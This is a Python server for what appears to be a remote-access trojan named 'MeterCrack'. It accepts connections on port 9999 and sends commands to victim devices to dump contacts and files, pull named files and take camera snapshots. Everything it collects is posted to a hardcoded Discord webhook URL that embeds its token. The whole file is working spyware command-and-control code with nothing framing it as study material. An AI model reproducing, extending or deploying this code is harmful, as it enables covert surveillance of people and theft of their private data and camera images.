import socket
import threading
import os
import requests
import json

webhook_url = 'https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2'

def send_to_discord(content, file_path=None):
    data = {
        "content": content,
        "username": "MeterCrack"
    }
    
    if file_path:
        files = {
            'file': open(file_path, 'rb')
        }
        requests.post(webhook_url, data=data, files=files)
    else:
        requests.post(webhook_url, data=json.dumps(data), headers={"Content-Type": "application/json"})

def handle_client(client_socket):
    while True:
        try:
            client_socket.send(b"metercrack> ")
            cmd = client_socket.recv(1024).decode().strip()

            if cmd == 'dump c':
                client_socket.send(b"DUMP_CONTACTS\n")
                contacts = client_socket.recv(4096).decode()
                send_to_discord(f"Contacts: {contacts}")
            elif cmd == 'dump f':
                client_socket.send(b"DUMP_FILES\n")
                files = client_socket.recv(4096).decode()
                send_to_discord(f"Files: {files}")
            elif cmd.startswith('send '):
                filename = cmd.split(' ')[1]
                client_socket.send(f"SEND_FILE {filename}\n".encode())
                with open(filename, 'wb') as f:
                    data = client_socket.recv(4096)
                    while data:
                        f.write(data)
                        data = client_socket.recv(4096)
                send_to_discord(f"File: {filename}", filename)
            elif cmd == 'cam_snap':
                client_socket.send(b"CAM_SNAP\n")
                client_socket.recv(1024)  # Acknowledge receipt
                send_to_discord("Camera snapshot taken")
            elif cmd == 'exit':
                client_socket.send(b"EXIT\n")
                client_socket.close()
                break
            else:
                client_socket.send(b"Invalid command\n")
        except Exception as e:
            print(f"Error: {e}")
            client_socket.close()
            break

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("Server listening on port 9999")

    while True:
        client_socket, addr = server.accept()
        print(f"Accepted connection from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    start_server()
